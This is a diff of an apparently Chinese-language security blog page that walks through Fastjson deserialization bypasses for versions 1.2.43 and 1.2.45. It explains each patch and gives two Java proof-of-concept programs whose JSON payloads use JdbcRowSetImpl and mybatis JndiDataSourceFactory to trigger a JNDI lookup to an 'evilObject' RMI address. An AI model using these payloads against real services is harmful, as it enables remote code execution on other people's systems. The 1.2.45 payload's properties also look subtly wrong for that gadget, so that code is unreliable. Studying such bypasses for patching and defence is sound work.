@@ -109,22 +109,71 @@
                 
                 <h2 class="section-heading">Fastjson=1.2.43</h2>
                 
-                <p>&nbsp;&nbsp;&nbsp;</p>
+                <p>&nbsp;&nbsp;&nbsp;在这个补丁中，采用两层if判断是否双写，是的话直接抛出异常。</p>
                 
-                <a data-fancybox="gallery" href="../img/2022-4-9/1-1.jpg">
-                	<img class="img-fluid" src="../img/2022-4-9/1-1.jpg" alt="">
+                <a data-fancybox="gallery" href="../img/2022-4-9/1-2.jpg">
+                	<img class="img-fluid" src="../img/2022-4-9/1-2.jpg" alt="">
               	</a>
                 
+                <p>&nbsp;&nbsp;&nbsp;在checkAutoType方法中，依然是用了哈希比较，但跟到loadclass方法就看得比较清楚了。
+                	可以看到这里跟之前L;的处理差不多，都是截取之后再去递归loadClass方法。</p>
                 
+                <a data-fancybox="gallery" href="../img/2022-4-9/1-3.jpg">
+                	<img class="img-fluid" src="../img/2022-4-9/1-3.jpg" alt="">
+              	</a>
                 
+                <p>&nbsp;&nbsp;&nbsp;后面payload添加的[和{其实可以通过报错去添加，没加的话会报错syntax error, expect [。</p>
+                
+              	
+              	<div>
+              		
+              		<pre class='hljs'><code><span class="hljs-keyword">import</span> com.alibaba.fastjson.<span class="hljs-type">JSON</span>;
+<span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.<span class="hljs-type">ParserConfig</span>;
+
+public class <span class="hljs-type">Fastjson4</span> {
+    public <span class="hljs-keyword">static</span> <span class="hljs-type">void</span> main(<span class="hljs-type">String</span>[] args) throws <span class="hljs-type">Exception</span>{
+        <span class="hljs-type">ParserConfig</span>.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);
+        <span class="hljs-type">String</span> payload = <span class="hljs-string">"{"</span> +
+                <span class="hljs-string">"\"seventeen\":{"</span> +
+                <span class="hljs-string">"\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[,"</span> +
+                <span class="hljs-string">"{\"dataSourceName\":\"rmi://127.0.0.1:1099/evilObject\","</span> +
+                <span class="hljs-string">"\"autoCommit\":true"</span> +
+                <span class="hljs-string">"}"</span> +
+                <span class="hljs-string">"}"</span>;
+        <span class="hljs-type">JSON</span>.parse(payload);
+    }
+}</code></pre>
+              		
+              		</div>
+                
+                <p>&nbsp;&nbsp;&nbsp;在Fastjson1.2.44的补丁中，类名开头出现[后会直接抛出异常。</p>
                 
                 <h2 class="section-heading">Fastjson=1.2.45</h2>
                 
-                <p>&nbsp;&nbsp;&nbsp;</p>
                 
-                <a data-fancybox="gallery" href="../img/2022-4-9/1-1.jpg">
-                	<img class="img-fluid" src="../img/2022-4-9/1-1.jpg" alt="">
-              	</a>
+                <p>&nbsp;&nbsp;&nbsp;这里参考jackson新加的黑名单，利用这个mybatis的依赖绕过，并且mybatis的版本需要是3.x并且<3.5.0。</p>
+                
+                <div>
+                	
+                	<pre class='hljs'><code><span class="hljs-keyword">import</span> com.alibaba.fastjson.<span class="hljs-type">JSON</span>;
+<span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.<span class="hljs-type">ParserConfig</span>;
+
+public class <span class="hljs-type">Fastjson5</span> {
+    public <span class="hljs-keyword">static</span> <span class="hljs-type">void</span> main(<span class="hljs-type">String</span>[] args) throws <span class="hljs-type">Exception</span>{
+        <span class="hljs-type">ParserConfig</span>.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);
+        <span class="hljs-type">String</span> payload = <span class="hljs-string">"{"</span> +
+                <span class="hljs-string">"\"seventeen\":{"</span> +
+                <span class="hljs-string">"\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\","</span> +
+                <span class="hljs-string">"\"dataSourceName\":\"rmi://127.0.0.1:1099/evilObject\","</span> +
+                <span class="hljs-string">"\"autoCommit\":true"</span> +
+                <span class="hljs-string">"}"</span> +
+                <span class="hljs-string">"}"</span>;
+        <span class="hljs-type">JSON</span>.parse(payload);
+    }
+}</code></pre>
+                	
+                	</div>
+                
                 
 
               
